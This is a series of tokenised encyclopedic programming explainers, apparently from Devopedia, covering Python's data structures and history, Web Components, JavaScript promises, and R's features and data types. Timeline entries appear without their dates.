For this purpose , use ` collections.namedtuple ` class .
This allows us to access the elements via their names rather than tuple indices .
It 's possible to convert between lists and tuples using the functions ` list ( ) ` and ` tuple ( ) ` .
When should I use set and dict ?
Sets and dictionaries have no order .
However , from Python 3.7 , the order in which items are inserted into a dict is preserved .
From Python 3.8 , we can iterate through a dict in reverse order .
Sets store unique items .
Duplicates are discarded .
Dictionaries can contain duplicate values but keys must be unique .
Since dict keys are unique , often dicts are used for counting .
For example , to count the number of occurrences of each word in a document , words can be keys and counts can be values .
Sets are suited for finding the intersection / union of two groups , such as finding those who live in a neighbourhood ( set 1 ) and/or also own a car ( set 2 ) .
Other set operations are also possible .
Strings , lists and tuples can take only integers as indices due to their ordered nature , but dictionaries can be indexed by strings as well .
In general , dictionaries can be indexed by any of the built - in immutable types , which are considered hashable .
Thus , dictionaries are suited for key - value pairs such as mapping country names ( keys ) to their capitals ( values ) .
But if capital is the more common input to your algorithm , use them as keys instead .
How can I implement a linked list in Python ?
A Linked list is a collection of nodes connected by links or pointers .
A node is a single data point in the linked list .
It not only holds the data , but also has a pointer to the next node in a single - linked list .
Thus , the definition of a node is recursive .
For a double - linked list , the node holds two pointers , one to the previous node and one to the next node .
A linked list can be designed to be ordered or unordered .
The head of the linked list must be accessible .
This allows us to traverse the entire list and perform all possible operations .
A double - linked list might also expose the tail for traversal from the end .
While a ` Node ` class may be enough to implement a linked list , it 's common to encapsulate the head pointer and all operations within the ` LinkedList ` class .
Operations on the linked lists are methods of the class .
One possible implementation is given by Downey .
A ` DoubleLinkedList ` can be a derived class from ` LinkedList ` with the addition of a tail pointer and associated methods .
Iterators are introduced into the language for looping through containers .
types ` int ` and ` long ` are unified into a single type .
Division operator is changed to have three variants : classic division ( truncation ) , true division , floor division ( using // operator ) .
Python 's creator Guido van Rossum relates the early history of Python with respect to numbers .
Implementation used machine integers and machine binary floating point .
He explains that ` int ` were treated as signed normally but were unsigned in bitwise operations ; but ` long ` were always signed and this caused problems .
The ` int ` type could also overflow and cause an exception .
Today , integers are unbounded .
The Python data model is changed such that the insertion order of items into a ` dict ` is preserved .
In October 2019 , with the release of Python 3.8 , ` dict ` can be iterated in reverse using the built - in function ` reversed ( ) ` .
The Python Logo .
Source : Python.org , 2018 .
Python is a general purpose programming language that blends procedural , functional and object - oriented functionality into scripting mode .
It has efficient high - level data structures , powerful flexible string handling and a simple but effective approach to object - oriented programming .
Python 's elegant syntax and dynamic typing , together with its interpreted nature , make it an ideal language for scripting and rapid application development in many areas on most platforms .
This pseudo - code nature of Python is one of its greatest strengths .
It allows you to concentrate on the solution to the problem rather than the language itself .
Python has an extraordinarily simple syntax .
Its creator , Guido van Rossum , says , Python is an experiment in how much freedom programmers need .
Too much freedom and nobody can read another 's code ; too little and expressiveness is endangered .
What 's so attractive about Python ?
Python can be easy to pick up whether you 're a first time programmer or you 're experienced with other languages .
Python allows you to write programs with fewer lines of code .
Very clear readable syntax and keywords , with proper indentation a part of syntax checking .
Declaration of variables is not required .
Object - oriented and imperative programming can be mixed .
easy to manipulate large data , can perform linear algebra and matrix operations with ` pandas ` , ` numpy ` , ` scipy ` , ` scikit - learn ` , etc .
for machine learning .
Lists , stacks , queues , dictionaries — you name it , Python has it .
Moreover , complex data structures like graphs can be easily implemented in python using a list of dictionaries .
How do you classify Python as a language ?
Python features .
Source : Devopedia , 2017 .
Python is a programming language that lets you work more quickly and integrate your systems more effectively .
It 's a high - level , interpreted , interactive and object - oriented scripting language .
It incorporates modules , exceptions , dynamic typing , very high - level dynamic data types , and classes .
Python is Interpreted : Python is processed at runtime by the interpreter .
You do not need to compile your program before executing it .
This is similar to Perl and PHP .
Python is Interactive : You can access a Python prompt and interact with the interpreter directly to write your programs .
Python is Object - Oriented : Python supports an object - oriented style or technique of programming that encapsulates code within objects .
Python is a Beginner 's Language : Python is a great language for beginner - level programmers and supports the development of a wide range of applications , from simple text processing to WWW browsers to games .
Python is Portable : It runs on many Unix variants , on macOS , and on Windows 2000 and later .
What are some applications where Python is suited ?
Python is versatile and it 's been used in a variety of applications : console programs , GUI apps including games , server - side programming for web / mobile apps including creation or use of web frameworks , apps that handle media ( image / audio / video ) , enterprise apps for ERP or CRM , data - oriented apps that can handle data in various formats and file types , database - driven apps , networking , scientific apps that require complex and intensive numerical computations , software development tools such as build tools , test automation , software delivery tools such as package managers or installers , system administration utilities , etc .
I 've heard of The Zen of Python .
What 's that ?
The Zen of Python .
Source : ewjoachim , 2013 .
Back in August 2004 , Tim Peters released an informational document that stated best practices or guiding principles that could benefit Python developers .
This document was released as PEP20 -- The Zen of Python .
Developers who wish to understand them can do so by studying sample Python code .
As a developer , how do I get started with Python ?
Python can be installed on Windows , Linux or Mac .
The default Python distribution by the Python Software Foundation can be installed .
For scientific applications , the Anaconda distribution is recommended .
Among the IDEs are IDLE , PyDev for Eclipse , PyCharm , Sublime Text , Visual Studio Code , Spyder , etc .
Sublime Text and Visual Studio Code are generic editors that can be enhanced with plugins to support Python .
For scientific apps , Spyder may be a good IDE to use .
Python comes with an interactive shell but IPython is an enhanced shell that offers more features .
The Jupyter Notebook allows programmers to combine code , results and descriptions into a nice flow that can be shared with others .
IPython and Jupyter Notebook are part of Anaconda distribution .
For installing new packages or updating existing ones , ` pip ` is the tool to use .
Since developers often work on multiple projects , and each project may use different packages or even versions of Python , it 's recommended to use virtual environments .
A virtual environment can be created using ` pip install virtualenv ` .
PEP8 is a style guide developers should read to make their code more readable and maintainable .
Can Python be used in embedded systems ?
Yes .
Devices that could be considered as embedded by modern standards and can run tuned versions of CPython include : Gumstix Raspberry Pi : The " Pi " in Raspberry Pi comes from Python .
BeagleBone Black MicroPython is a lean and efficient implementation of a subset of Python 3 .
It 's optimised to run on microcontrollers with as little as 256 K of Flash and 16 K of RAM .
The pyboard is a compact and powerful development board that runs MicroPython .
A quick reference to programming the pyboard is available .
MicroPython is supported on a number of MCUs , including many variants from STMicroelectronics .
Can I use Python along with other languages in a single program ?
A flow that illustrates how Python is compiled and interpreted .
Source : Marsh , 2013 .
Yes .
For example , time - critical code could be in C and this could be invoked from within Python .
In fact , Python is a specification that has been implemented in many different languages .
This makes it easier to interface Python with code from other languages .
The interpreter compiles Python source code into bytecode and executes on a virtual machine .
Following are some existing implementations : < tr > < th > Implementation</th > < th > Virtual Machine</th > < th > Compatible Language</th > < /tr > < tr > < td > CPython</td > < td > CPython VM</td > < td > C</td > < /tr > < tr > < td > Jython</td > < td > Java Virtual Machine</td > < td > Java</td > < /tr > < tr > < td > IronPython</td > < td > CLR</td > < td > C#</td > < /tr > < tr > < td > Brython</td > < td > JavaScript engine ( eg .
V8)</td > < td > JavaScript</td > < /tr > < tr > < td > RubyPython</td > < td > Ruby VM</td > < td > Ruby</td > < /tr > Python implementation in RPython ( a subset of Python ) is called PyPy , which is fast due to JIT ( just - in - time ) compilation .
PyPy aims to be cross - platform , memory - light and stackless - supportive .
Guido van Rossum at CWI in the Netherlands encounters some shortcomings with ABC programming language on the Amoeba operating system .
He likes the scripting syntax of ABC but does n't want to create an Amoeba - specific language .
So he decides to create an extensible language , giving due importance to exception handling .
He started the implementation during the 1989 Christmas holidays .
Guido van Rossum uploads Python to USENET , thus making it publicly available for the first time .
Python 2.0 is released .
Starting from this release , the development of the language has become more open and community driven .
Python 2.6 is released .
The development of this release is synchronized with that of Python 3.0 .
Thus , Python 2.6 incorporates some changes that are part of Python 3.0 .
This backporting is expected to make way for easier migration of Python 2.6 + code to Python 3.x .
Module ` future_builtins ` has 3.0 semantics .
Python 3.0 has been released .
It simplifies some of the unwieldy syntax that was in Python 2.x .
It 's not backward compatible with Python 2.x and hence its release is seen as controversial .
However , Python 3.x is the future of the language .
Python 2.7 is released .
It includes some features introduced in Python 3.1 .
Python 2.7.x releases will receive bug fixes as well as backports from Python 3.x to make it easier in the future to migrate that code to Python 3 .
It 's the last 2.x release ( there wo n't be a 2.8 release ) .
It 's expected to be retired in January 2020 , implying that it will be maintained for 10 years since its initial release .
Python 3.6.4 has been released .
In 2017 , Python was ranked among the top 5 languages .
Python is promoted and managed by the Python Software Foundation .
A webpage can be composed from modular self - contained parts .
Source : Fink 2016 , slide 8 .
A webpage can be built in two ways : either as a monolithic unit of HTML tags or as a composition of individual parts : header , footer , menu , main body , side panel , and so on .
The latter is easier to maintain due to its modular nature .
Such modular design has been in common practice on the server side where pages are dynamically generated from modular views .
Web Components enable this on the client side .
While the use of components is possible with frameworks or libraries such as Ember , Backbone , Angular or React , Web Components is a W3C standard .
It relies on nothing more than HTML , CSS and JS .
It can therefore work on all browsers , can complement and be reused across front frameworks .
Libraries built on top of Web Components are also making development simpler .
What exactly is a web component ?
Here 's one way to define a web component . A component is a small , potentially re - usable set of logic , behaviors and interface elements ( UI or API ) .
This definition is not just about the frontend element 's presentation , but it 's also about its behaviour .
Consider a clickable button .
The component for this could define the styling in terms of padding , colours and fonts .
It could also define the behaviour : how the styling changes on mouse hover or mouse click ; what happens when the mouse is clicked .
Another example is an image slider .
These are usually implemented using HTML , CSS , and JavaScript , all of which can be encapsulated as a custom tag for reusability .
Web Components are being developed by W3C as a set of standards .
Once fully standardized and implemented by browsers , it will change the way we design web apps .
What are the advantages of adopting Web Components ?
Here are some advantages of Web Components : Reuse : A component is made once and can be reused across different pages , apps , or frameworks .
Support : Once fully standardized , it will work on any browser without additional libraries .
Maintenance : Since the design is modular , and components are self - contained , they 're easier to maintain .
Encapsulation : Each component on the same page can potentially have different styling .
We need not worry about clashing element identities .
This is due to what 's called Shadow DOM .
Reliability : Code is not spread across HTML and JS files , thereby avoiding inconsistencies .
Flexibility : Components can be written inline , imported or even compiled .
Composability : Components can use or interface with other components .
What are the main parts of Web Components ?
An explanation of Web Components .
Source : The Startup Lab 2017 .
Web Components have four enabling parts : Custom Elements : We can create custom HTML tags / elements and define their initialization and behaviour .
These can be created using JavaScript APIs .
The use of ES6 Class is recommended rather than creating a prototype object .
HTML Templates : Tag ` & lt;template&gt ; ` provides a markup template that can then be reused in multiple places .
Templates themselves are not displayed ; only their instances are displayed .
HTML Imports : An HTML file can be imported into another HTML file .
Thus , components defined in one file can be imported into components defined in another file .
Shadow DOM : This is an encapsulated DOM tree that 's separate from the main document DOM .
This encapsulation ensures that the component will work regardless of the page on which it 's used .
How should I use attributes , properties and events in my components ?
Pass data in and out only via standard interfaces to keep components interoperable .
Source : Dodson 2016 .
In the spirit of reuse and composability , use attributes and properties for data input .
Dispatch events for output .
For example , if a button is clicked , dispatch an event so that other components can take appropriate action .
Do n't bubble events unless they have semantics .
Use attributes to initialize .
Use properties to reflect the status .
Every exposed attribute should have a corresponding property .
Reflecting a property change to an attribute is generally not a good idea .
This is because attributes are limited to string values .
This means that expensive serialization and deserialization is needed to pass arrays and objects as strings via attributes .
Therefore , use properties instead .
Favour declarative over imperative API .
For instance , avoid changing state via method calls that do n't update property or dispatch events .
Could you share some best practices for working with Web Components ?
Here are some best practices : When defining custom elements , use prefixes before the hyphen to indicate a custom " namespace " .
Custom elements that use unconventional names can be hard to understand .
Try to stay close to standard HTML tag names .
Do n't raise exceptions from custom elements when for similar errors , the native DOM itself will ignore and continue .
Configuration and state should be exposed in the logical DOM , not hidden in the Shadow DOM .
Try to make your component self - contained without reliance on external frameworks .
This makes it easy for others to reuse your components .
More best practices are given on Google Developers site with illustrative examples .
How can I use Web Components with front - frameworks or libraries ?
Web Components are set to change the way we build web apps , but they need not replace frontend - frameworks or libraries .
The two can complement each other .
For example , React can be used in Web Components or vice versa .
Whereas React keeps DOM in sync with data , Web Components encapsulate reusable components well .
Use Shadow DOM to avoid conflict with frameworks that manage DOM updates and rendering .
Also , VirtualDOM Abstraction Layer ( VAL ) gives better control over DOM along with any virtual DOM such as React or Preact .
To convert Web components to first - class React components , react - integration can be used .
Angular Elements offers custom elements but these currently have dependence on the Angular framework .
Developers who wish to develop components that can be used across any framework can look at Ionic 's Stencil , SlimJS or SkakeJS .
It 's been said that SkateJS enables the use of React 's JSX with Web Components .
For data bindings , Observables and ES6 Proxies may play well with Web Components .
In passing , we mention that Accelerated Mobile Pages ( AMP ) are in fact built from Web Components and are incredibly performant .
What 's the current state of browser support for Web Components ?
Browser support for Web Components as of June 2018 .
Source : WebComponents.org 2018a .
The latest status of browser support for Web Components is available on the Can I Use site .
Chrome and Opera offer the best support for Web components .
Browsers that do n't have full native support , can use polyfills .
A polyfill is a substitute implementation that a developer can use or import into a codebase until browsers natively start supporting that feature or technology .
Web Components polyfills are available on GitHub .
Developers can build custom components on their own .
For faster development , they can also reuse components developed and shared by others as component libraries .
WebComponents.org lists 1500 + reusable elements as of June 2018 .
Developers can also adopt component frameworks that simplify the development process .
Examples of such frameworks include Google Polymer , Mozilla X - Tag and Bosonic .
In terms of W3C standardization , the ` & lt;template&gt ; ` element is specified within the HTML 5.2 W3C Recommendation .
Shadow DOM is specified in the DOM document .
The Web Components Current Status page summarizes the status .
Microsoft created HTML Components ( HTC ) to extend the DOM with new attributes .
It relies on JScript and VBScript and Microsoft ActiveX is required .
In 2011 , this was discontinued and deprecated on IE10 .
Mozilla introduces XML Binding Language ( XBL ) .
The idea is to extend default tags with custom behaviour .
XBL2 came out in 2007 .
While the intention is good , the implementations are not .
This was eventually abandoned in 2012 .
From the failure of vendor - oriented approaches , comes the idea of frameworks or libraries that can offer custom elements in a cross - browser compatible manner .
In 2010 , AngularJS was released .
Likewise , React was born in 2011 and is used internally by Facebook .
At the Fronteers 2011 conference , Alex Russell gave a talk titled " Web Components and Model Driven Views " .
He explains how JS frameworks are trying to do what HTML is supposed to do .
He then outlines scoped CSS , custom elements and web components .
W3C publishes a working draft titled " Introduction to Web Components " .
Google Chrome and Opera browsers started supporting v0 of Web Components .
In 2016 , the same browsers started supporting v1 of Web Components .
In asynchronous programming , it 's common practice to use callbacks so that the main thread can continue with other processing rather than wait for the current function to complete .
When that function completes , a relevant callback function is called .
Writing and maintaining asynchronous code can be difficult .
Promises offer a syntax that enables better code structure and flow .
A promise is an object that 's returned immediately when an asynchronous call is made even when such a call has not completed .
This object is constructed and returned " with the promise " that its contents will be filled in at a later point when the asynchronous call completes .
Formally , a promise represents the eventual result of an asynchronous operation .
Promises have become popular since the mid-2010s in the world of JavaScript and web development , although promises are not exclusive to JavaScript .
Why do we need promises ?
Promises solve the Pyramid - of - doom problem and enable clean exception handling .
Source : Adapted from Stittri , 2016 .
Asynchronous code often ends up with deeply nested callbacks .
Programmers often call this callback hell or pyramid of doom .
This happens because in the async code we ca n't return values because such values are not yet ready .
Likewise , we ca n't throw exceptions because there 's no one to catch them .
Promises solve this by flattening the program flow .
Because each asynchronous call immediately returns a promised object , this object can then be used to specify the callback functions for both success and failure cases .
In particular , the ` then ` method of a promised object allows us to specify the callbacks .
This method also returns another promise object , thus facilitating a chain or composition of promises .
Asynchronous code written with promises is closer in spirit to how we write synchronous code .
In synchronous code , we are used to ` return ` , ` throw ` and ` catch ` statements .
This functionality was lost in the world of asynchronous callbacks .
Essentially , the point of promises is to give us back functional composition and error bubbling in the async world .
What are the essentials of a promise ?
A chain of promises makes for a cleaner code .
Source : Aderinokun , 2016 .
A promise is a first - class object , meaning that it can be copied , passed as arguments or returned from functions .
Moreover , a promise is returned even before the result of an async call is ready .
This allows us to call methods of the object ( such as ` then ` method ) while the async call is still in progress .
Callbacks can be specified via the ` then ` method .
Two things are possible when the ` then ` method is called : If the async call has already completed ( or it could even be a synchronous call ) , the promised object will invoke the relevant callback immediately .
If the async call is still pending , the promised object will register the callback but call it later .
In either case , the ` then ` method returns a new promised object and this is important to enable chaining .
Multiple callbacks can be added by calling ` then ` multiple times .
Promises also simplify the handling of exceptions .
Anytime an exception is thrown it can be handled by a single ` catch ` method .
In fact , the ` catch ` method is a simplification of the ` then ` method for exception handling .
What are the states and rules of transition of a promised object ?
States and transitions of a promised object .
Source : MDN Web Docs , 2018 .
A promise can be in one of three states : pending : This is the initial state .
fulfilled : This is accepted if the execution succeeds .
The promise is fulfilled with value .
rejected : This is entered if execution fails .
Rejection comes with a reason .
A promise that 's either fulfilled or rejected is said to be settled .
This is an apt term , since a promise that 's settled is an immutable object .
Its value ( when fulfilled ) or reason ( when rejected ) can not change .
Immutability is important so that consumers of the promise are prevented from introducing side effects .
A promise is said to be resolved if it 's either settled or " locked in " to the state of another promise .
Once resolved , any attempt to resolve it again will have no effect on the promise .
An unresolved promise , a promise that 's not resolved , is in a pending state .
What are the methods of a promising object ?
The Promises / A+ standard specifies the ` then ` method to access the eventual value or reason .
For interoperability , no other method needs to be specified .
However , it 's common for other standards or implementations to have other methods .
For example , ECMAScript 2015 specifies : methods ` all ` , ` race ` , ` reject ` and ` resolve ` of ` Promise ` Methods ` then ` , ` catch ` and ` finally ` of a ` Promise.prototype ` Among the non - standard methods are ` Promise.denodeify ` , ` Promise.prototype.done ` , ` Promise.prototype.finally ` and ` Promise.prototype.nodeify ` .
GuzzleHttp 's Promise implementation in PHP provides methods ` otherwise ` , ` wait ` , ` getState ` and ` cancel ` .
Bluebird adds useful methods such as ` map ` , ` some ` , ` any ` , ` filter ` , ` reduce ` , ` each ` and ` props ` .
Could you share some details of the ` then ` method ?
A promise must have a ` then ` method that accepts two arguments and returns another promise : ` q = p.then(onFulfilled , onRejected ) ` , where the following holds true for promises ` p ` and ` q ` : Arguments ` onFulfilled ` and ` onRejected ` are both optional If ` onFulfilled ` is a function , it 's called once when ` p ` is fulfilled If ` onRejected ` is a function , it 's called once when ` p ` is rejected Promise ` q ` is resolved with value ` x ` if either function ` onFulfilled ` or ` onRejected ` returns ` x ` Promise ` q ` is rejected with reason ` e ` if either function ` onFulfilled ` or ` onRejected ` throws an exception ` e ` If ` onFulfilled ` is not a function , ` q ` will be fulfilled with the value of ` p ` when fulfilled If ` onRejected ` is not a function , ` q ` will be rejected with the reason of ` p ` when rejected For interoperability , non - promises can be treated as promises if they provide the ` then ` method , for example , using duck typing .
Such an object is called a thenable .
Can you give some use cases where promises might simplify my code ?
Promises can enable us to sequentially call a bunch of async functions .
We can handle all errors in a single code block if we wish to do so .
We can trigger multiple async calls and do further processing only when all of them are completed ; or exit if any one of them throws an exception ; or handle the first one that completes and ignore the rest .
Promises enable us to return async calls more easily .
What are some tools for working with promises ?
If your browser does n't support promises , a polyfill will be needed .
One option is to use promise - polyfill .
Another polyfill is called es6-promise .
Bluebird is a JS library for promises .
It can be used in Node.js and browsers .
Using " promisification " , it can convert an old API into a promise - aware API .
Another useful library is Q .
Alternatives include promise , lie , when and RSVP .
A comparison of these promised libraries by size and speed is available .
Mocha , Chai and Sinon .
There are three suggested tools for testing asynchronous program flow .
Mocha and Chai in combination work nicely for testing promises .
Can you give some tips for developers ' coding promises ?
Illustrating different ways in which the ' then ' method can be exited .
Source : Lawson , 2015 .
Here are some tips , for beginners in particular : It 's possible to write promise - based code in the manner of callback - style nested code .
This is bad practice .
Instead , use a promise chain .
Always handle errors using either ` then(null , onRejected ) ` or ` catch ( ) ` .
Avoid using the old - style ` deferred ` pattern that used to be common with jQuery and AngularJS .
Always return a value or throw an exception from inside ` then ` and ` catch ` methods .
This is also handy for converting synchronous code into promisey code .
` Promise.resolve ( ) ` can wrap errors that occur in synchronous code .
Be sure to use a ` catch ` to handle all errors .
Note that ` then(onFulfilled).catch(onRejected ) ` is different from ` then(onFulfilled , onRejected ) ` .
The latter code will not catch exceptions that may occur inside the ` onFulfilled ` function .
I have a bunch of promises I wish to call sequentially .
Can I use a ` for ` loop ?
This is an interesting case where each promise invokes ( presumably ) some asynchronous code and yet we wish to wait for each asynchronous call to complete before we start the next promise .
A promise is executed as soon as it 's created .
If you have a bunch of promises to be called in sequence , any loop construct such as ` forEach ` will not work .
Instead , they use a chain of promises , that is , each promise is constructed within the ` then ` method of the previously fulfilled promise .
The concept of promises is born in the domain of parallel computing .
It 's called by different names : futures , promises , eventuals .
MIT researchers present a paper that defines and explains promises .
They describe how promises can aid asynchronous programming in distributed systems , including sequences of async calls .
It references an async communication mechanism called call - streams and illustrates the concepts in the Argus programming language .
Discussion starts within a CommonJS Google Group to specifying an API for promises .
An initial version of Promises / A was published in February 2010 .
Promises / A+ specification version 1.0 is released .
Versions 1.1 and 1.1.1 were subsequently released in 2013 and 2014 respectively .
Promises / A+ is based on the earlier Promises / A but has some omissions , clarifications and additions .
Specifically , progress handling and interactive promises are omitted .
The focus has been to arrive at a minimal API for interoperability .
For interoperability , the specification details the behaviour of the ` then ` method of a promised object .
The specification does n't talk about how to create , fulfill or reject promises .
Promise is introduced in ECMA Script 2015 , 6th Edition .
R logo .
Source : R Project 2016 .
R is a free software environment for statistical computing and graphics .
This definition implies that R is open source , is designed for statistical computing and has strong graphing capabilities .
R is a language but also an environment in the sense that it 's for users who wish to do interactive statistical analysis and modelling , but who are not necessarily programmers .
R is based on S , a language from the 1970s .
While R has evolved a lot , it still retains many of the design constructs of its early days .
In recent times , adoption of R is growing due to interest in Big Data and Data Science .
However , the use of R should be seen as complementary to other languages such as Python .
How would you describe R ?
R is a language that 's influenced by two different paradigms : object - oriented programming and functional programming .
Everything in R is an object .
Computations in R are function calls .
In fact , function definitions and function calls are also objects .
It 's also an interpreted language ( no compilation is required ) .
The object referenced in R is a combination of name and context called environment .
Changing an object by local references will affect the object only within the local environment .
A function call translates to the creation of a new environment .
Hence , phrases " call by value " or " call by reference " common in other languages , are not applicable in R. There are no scalar types in R. Vector - based types are used .
Lazy arguments are used for functions .
In other words , the arguments are evaluated inside the functions only when required .
What are the advantages of R ?
Some of the advantages of R. Source : Business Process Incubator 2016 .
Unlike S - PLUS , SAS or SPSS , R is open source and can be used without any licensing fee .
R is cross - platform : it can be used on Linux , Windows or MAC OS .
R is supported by a large community .
Along with frequent releases by a core team , the wider community has released thousands of packages that are available at the Comprehensive R Archive Network ( CRAN ) .
Beyond this community of volunteers , R is backed by big companies .
The R Foundation and the R Consortium are committed to the evolution of R. R and many third - party packages are suited for data analysis and modelling .
R simplifies the work of a data scientist by offering tools for easy data manipulation , visualization and modeling .
At its core , R operations are vectorized .
This means that vectors and matrices can be easily handled .
Because it 's interpreted , R is highly interactive .
R users can start using R interactively , and as they gather more expertise , they can do more complex things by writing R scripts .
What are the typical applications where R is used ?
R is popular among data scientists because of the many statistical packages that it offers .
Quantitative analysts use R. It 's been used in diverse fields : biotech , finance , research , high technology industries , and more .
Anywhere there 's a need to produce production - quality plotting , R is a suitable choice .
Likewise , in the area of Machine Learning , R has an advantage because of its strong ties with academia .
In econometrics , one researcher explained that R enabled him to do complex regressions .
He was able to do this via custom matrix algebra and validate the results against those offered by R packages .
When there 's a need to look at complex statistical properties , R has an advantage .
According to data scientist Matt Adams , I would n't even say R is for programmers .
It 's best suited for people that have data - oriented problems they 're trying to solve , regardless of their programming aptitude .
What are some criticisms of R ?
R is said to be poor in memory management .
Because of the requirements of environments , all objects must be stored internally rather than as files on disk .
In recent times , this limitation has been somewhat remedied .
Newer developments from Microsoft are expected to address this as well : ParallelR for distributed computing , Rhadoop for running on Hadoop nodes , Reproducible R Toolkit and RevoPemaR for writing parallel external memory algorithms .
Also , there are packages and tools to handle Big Data in R. R is worse in terms of performance and lacks proper unit testing frameworks .
Security was not built into R at the design stage .
This means that we ca n't use it via web server or embed it in a web browser .
However , the use of isolated virtual containers can provide the necessary security to make this possible in the world of cloud computing .
Likewise , Shiny is an R package that can be used to create interactive web applications .
DeployR is another package for bringing R analytics to web dashboards .
For Data Science , should I choose R or Python ?
Both R and Python are open source .
Both are maintained by active communities .
Both are interpreted languages .
Both can be used interactively .
Both have good tools to work with .
While Python has 138,000 + packages , R has 12,000 + packages ( May 2018 ) .
This is expected since Python is versatile while R is more focused on statistical computing .
R is said to have more statistical packages that suit the work of a data scientist .
However , Python 's capability is getting better due to NumPy , Pandas , scikit - learn , Keras , and TensorFlow .
Python 's graphical capabilities are also improving with matplotlib , Bokeh , Seaborn , and Plotly .
Because Python is more object - oriented , it may be a better choice for large projects .
If the main work is data analysis , R must be preferred .
If work involves gathering and cleaning data as well , Python may be a better choice .
Having said that , statisticians tend to prefer R while computer scientists go with Python .
A mix of the two , each suited to its strengths , is a good choice .
Python could be used for preprocessing data while R could do the statistical analysis .
As a beginner , how can I get started with R ?
Download and install R .
This is sufficient to execute R commands and scripts .
For better developer experience , download and install RStudio .
This is an IDE that integrates a text editor with syntax checking , an R console to execute commands , easy access to documentation , a panel to view variables for debugging , a plot viewer , and more .
Read about the most useful third - party packages .
Install these from CRAN as required by your projects .
One approach is to install a tidyverse collection of packages .
This will install a number of packages useful for data science work .
Learn one or more of R Markdown , Shiny , Knitr and Bookdown .
These will help you to document your code , its results and share the same with others in various formats .
Learn language syntax .
Get familiar with R data types and structures .
In particular , learn about vectors , lists and data frames .
Next , learn about R 's graphing capabilities .
Common plotting systems to learn are Base and ggplot2 .
A new language by the name of S was initiated by Bell Labs for statistical computations .
It 's written in Fortran .
In 1988 , it was rewritten in C. S - PLUS is a commercial implementation of S. R language , announced to the public by Ross Ihaka and Robert Gentleman in the Department of Statistics at the University of Auckland .
Their work on R started in 1991 .
For portability , R is coded in ANSI standard C. In syntax , R resembles S but the underlying semantics are based on the Scheme .
Ihaka mentions , we implemented the language by first writing an interpreter for a Scheme subset and then progressively mutating it to resemble the S. R source code that is released to all under the Free Software Foundation 's GNU GPL license .
The R Core Group was formed to handle change requests .
Group members are volunteers and contribute whenever possible .
R version 1.0.0 has been released to the public .
The R Consortium was founded to " support the worldwide community of users , maintainers and developers of R software " .
The Consortium collaborates with R Foundation ( founded in 2003 ) , the governing body of the R Project .
Products from Revolution Analytics are integrated into Microsoft 's product portfolio .
Source : Smith 2016a .
Microsoft acquired Revolution Analytics , which offers both community and enterprise distributions of R. In January 2016 , Microsoft announced that Revolution products would be renamed / integrated into Microsoft 's products .
The R version 3.5.0 has been released .
In May 2018 , Microsoft R Open ( MRO ) version 3.5.0 became available .
There are about 12,500 + packages on the The Comprehensive R Archive Network ( CRAN ) .
A similar number is listed on the Microsoft R Application Network ( MRAN ) .
Five data structures in R. Source : Wickham 2018 .
R is an object - oriented language and all data structures are objects .
R does n't provide programmers with direct access to memory and all data must be accessed via symbols or variables that refer to objects .
Since vectorized operation is an important aspect of R , R does not have any scalars .
The most basic data structure is a ` vector ` , which is a sequence of data items .
Thus , a single integer value is treated as an integer vector of unit length .
The most versatile data structure is the ` list ` while the most common one used for data analysis is the ` data.frame ` .
The terms data type and mode usually refer to what is stored ( integer , character , etc .
) .
The term data structure usually refers to how data is stored , that is , the containers ( vector , list , etc .
) .
What data types are available in R ?
Their data types are many .
The common ones include ` integer ` , ` real ` , ` complex ` , ` logical ` and ` character ` .
The types ` integer ` and ` real ` are termed as ` numeric ` .
There 's no separate " string " type .
Instead , the ` character ` type is sufficient to denote strings .
Integers are specified with a suffix " L " , such as ` 23L ` or ` -2L ` .
Real numbers are specified without this suffix , such as ` 2.3 ` or ` 23 ` .
Examples of complex numbers are ` -2 + 3i ` and ` -45i ` .
Logical types can take values ` TRUE ` or ` FALSE ` .
These have shortforms ` T ` and ` F ` .
Character type can be specified by a matching pair of single or double quotes , such as ` " R " ` , ` ' R ' ` or ` " This is R !
" ` .
Could you compare vector , matrix , array , list and data.frame ?
Example representations of different data structures in R. Source : Ceballos and Cardiel 2013 .
The following data structures are common in R : ` vector ` : Contains a sequence of items of the same type .
This is the most basic structure .
Items of a vector can be accessed using ` [ ] ` .
Function ` length ` can be called to know the number of items .
` list ` : Represented as a vector but can contain items of different types .
Different columns can contain different lengths .
Items on a list can be accessed using ` [ [ ] ] ` .
This is a recursive data type : lists can contain other lists .
` array ` : An n - dimensional structure that expands on a vector .
Under the hood , this has ` dim ` and optionally ` dimnames ` attributes , which do n't exist for vectors .
Like vectors , all items must be of the same underlying type .
` matrix ` : A two - dimensional array .
` data.frame ` : While all columns of a matrix have the same type , with data frames , different columns can have different types .
Formally , vectors can be said to be of two types : atomic vectors ( items of same type ) and lists .
In practice , when we say vectors , we are referring to atomic vectors .
What are the factors ?
Consider the sex of a person .
This variable can have only two possibilities or categories : male or female .
We call this categorical data and factors are used to represent such data .
Roughly equivalent to an " enum " type in C , factor represents a finite set of values .
Under the hood , these are nothing more than integer vectors with each integer representing one category .
In R , these possible values are called levels .
Thus , though sex may contain values " male " or " female " , these are not characters but integers .
In addition , factors can be ordered or unordered .
For example , sex may be defined as an unordered factor .
Olympics medals may be defined as ordered factors such as Bronze & lt ; Silver & lt ; Gold .
Is the NULL object a special data type ?
The R documentation states that " the NULL object has no type and no modifiable properties " .
Attributes do n't apply to NULL .
When you want to indicate absence , NULL can be used .
A vector or list of zero length is not the same as NULL .
How to interpret the functions class , mode , typeof and storage.mode ?
Comparing the outputs of class , mode , typeof and storage.mode .
Source : Cotton 2016 .
All these functions can be called on R with differing results .
Function ` class ` represents the object 's abstract type whereas ` typeof ` is the object 's specific type .
A good example is factors : its class ` factor ` but its type is ` integer ` .
Another example is a data frame : its class is ` data.frame ` but its type is ` list ` .
Function ` mode ` is similar to ` typeof ` and it exists for compatibility with R 's predecessor , the S language .
function ` storage.mode ` also exists for compatibility with S. It 's useful when interfacing with code in other languages .
For example , consider a vector of integers .
Functions typeof , mode and storage.mode will respectively return ` integer ` , ` numeric ` and ` integer ` .
In S , both integers and reals have the same mode and hence Storge.mode becomes useful .
Hadley Wickham has commented that it 's best to avoid using mode and storage.mode in R. If we need the underlying type , call ` typeof ` should be preferred over ` storage.mode ` .
What are some basic operations on R vectors ?
Here are some basic operations on vectors : Combining : We can combine vectors into a single vector .
Eg .
` v < - c(v1 , v2 ) ` to combine v1 and v1 into v. Indexing : Indexing starts from 1 .
Negative numbers imply selecting all others except those specified .
Eg .
` v[1 ] ` for the first element ; ` v[-3 ] ` for elements except the third one .
Indexing may be treated as a special case of subsetting .
